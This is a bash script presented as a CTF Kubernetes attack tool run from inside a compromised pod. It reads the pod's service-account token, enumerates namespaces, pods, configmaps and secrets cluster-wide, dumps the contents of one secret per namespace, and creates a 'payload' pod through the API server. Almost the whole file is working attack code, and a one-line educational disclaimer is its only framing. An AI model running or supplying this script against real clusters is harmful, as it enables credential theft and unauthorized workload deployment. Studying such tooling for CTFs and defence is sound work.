#!/bin/bash

# ==============================================================================
#      ** K8s Cluster-Wide Recon & Attack Script (from within a pod) **
#
# This script simulates a cluster-wide reconnaissance mission for a CTF.
# It uses a compromised Service Account token to iterate through all visible
# namespaces, enumerate resources, and then deploy a payload pod.
#
# WARNING: For educational and testing purposes only.
# ==============================================================================

# --- Configuration ---
PAYLOAD_POD_NAME="igotyou"
CONTAINER_IMAGE="ubuntu:22.04"
CONTAINER_COMMAND='["sleep", "3600"]'

# --- Helper for pretty printing ---
echo_header() {
    echo " "
    echo "=============================================================================="
    echo "  $1"
    echo "=============================================================================="
}

# ==============================================================================
# PHASE 1: AUTO-DISCOVERY & SETUP
# ==============================================================================
echo_header "PHASE 1: Auto-Discovery and Setup"

# The pod's own namespace is automatically detected
ORIGINAL_NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "[INFO] Pod's original namespace: $ORIGINAL_NAMESPACE"

# API server address is injected by Kubernetes
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
echo "[INFO] API Server URL: $APISERVER"

# Read the Service Account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "[INFO] Service Account token loaded."

# Path to the cluster's CA certificate and common curl options
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
CURL_OPTS=(-s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN")

# ==============================================================================
# PHASE 2: CLUSTER-WIDE RECONNAISSANCE
# ==============================================================================
echo_header "PHASE 2: Initiating Cluster-Wide Reconnaissance"

echo "[ACTION] Fetching all visible namespaces..."
# The `grep`/`cut` combo extracts the names without needing jq
NAMESPACES=$(curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces" | grep -o '"name":"[^"]*' | cut -d '"' -f 4)

if [ -z "$NAMESPACES" ]; then
    echo "[ERROR] Could not list any namespaces. The token may be heavily restricted."
    exit 1
fi

echo "[SUCCESS] Found namespaces. Beginning enumeration loop..."

# Loop through each discovered namespace
for ns in $NAMESPACES; do
    echo " "
    echo "--- Scanning Namespace: $ns ---"

    # --- List Pods in the namespace ---
    echo "[+] Listing Pods in '$ns':"
    curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$ns/pods" | sed 's/{"kind":/\n{"kind":/g' | grep "Pod" || echo "  No pods found or access denied."

    # --- List ConfigMaps in the namespace ---
    echo "[+] Listing ConfigMaps in '$ns':"
    curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$ns/configmaps" | sed 's/{"kind":/\n{"kind":/g' | grep "ConfigMap" || echo "  No configmaps found or access denied."

    # --- List and attempt to read Secrets in the namespace ---
    echo "[+] Listing Secrets in '$ns':"
    SECRETS_JSON=$(curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$ns/secrets")
    echo "$SECRETS_JSON" | sed 's/{"kind":/\n{"kind":/g' | grep "Secret" || echo "  No secrets found or access denied."

    FIRST_SECRET_NAME=$(echo "$SECRETS_JSON" | grep -o '"name":"[^"]*' | head -n 1 | cut -d '"' -f 4)

    if [ -n "$FIRST_SECRET_NAME" ]; then
        echo "  [>>] Found secret '$FIRST_SECRET_NAME'. Attempting to read its contents..."
        curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$ns/secrets/$FIRST_SECRET_NAME"
        echo " "
    fi
done


# ==============================================================================
# PHASE 3: PAYLOAD DEPLOYMENT
# ==============================================================================
echo_header "PHASE 3: Attempting to Deploy Payload in Original Namespace"

echo "[ACTION] Sending request to create pod '$PAYLOAD_POD_NAME' in namespace '$ORIGINAL_NAMESPACE'..."

HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  "${CURL_OPTS[@]}" \
  -H 'Content-Type: application/json' \
  -X POST \
  --data "{
      \"apiVersion\": \"v1\",
      \"kind\": \"Pod\",
      \"metadata\": {
          \"name\": \"$PAYLOAD_POD_NAME\"
      },
      \"spec\": {
          \"containers\": [
              {
                  \"name\": \"payload-container\",
                  \"image\": \"$CONTAINER_IMAGE\",
                  \"command\": $CONTAINER_COMMAND
              }
          ]
      }
  }" \
  "$APISERVER/api/v1/namespaces/$ORIGINAL_NAMESPACE/pods")

# --- Result ---
if [ "$HTTP_STATUS" -eq 201 ]; then
  echo "✅ SUCCESS! Payload pod '$PAYLOAD_POD_NAME' created (HTTP Status: $HTTP_STATUS)."
else
  echo "❌ FAILED! The API server returned an error (HTTP Status: $HTTP_STATUS)."
fi

echo " "
echo "--- Script Finished ---"
